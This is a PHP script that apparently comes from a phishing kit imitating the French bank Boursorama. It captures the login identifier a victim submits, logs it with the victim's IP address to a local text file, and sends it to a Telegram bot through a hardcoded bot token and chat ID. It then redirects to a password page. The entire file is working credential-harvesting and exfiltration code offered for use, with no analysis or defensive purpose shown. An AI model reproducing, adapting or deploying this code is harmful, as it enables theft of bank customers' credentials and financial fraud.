<?php
ob_start();
session_start();

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
if(isset($_POST['identifiant'])){

$_SESSION['identifiant'] = $_POST['identifiant'];

$message  = "[+]━━━━【🏦 BOURSO / LOG 】━━━[+] \n";
$message .= "[🆔 Identifiant]  : ".$_POST['identifiant']."\n";
$message .= "\n";
$message .= "[🔍 IP INFO] : http://www.geoiptool.com/?IP=$ip\n";
$message .= "==========[ Bourso  INFO]=========";
$fh = fopen('XXD.txt' ,'a');
fwrite($fh, ' '."".$message ."\n\n");
fclose($fh);
$token = "8942970138:AAGWB2jmCozyKCo1PZX18paXoBFXRPumdm4";
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=8933881160&text=" . urlencode($message)."" );
header("Location:./pass.php");
}else{
header("Location:./pass.php");
}

?>
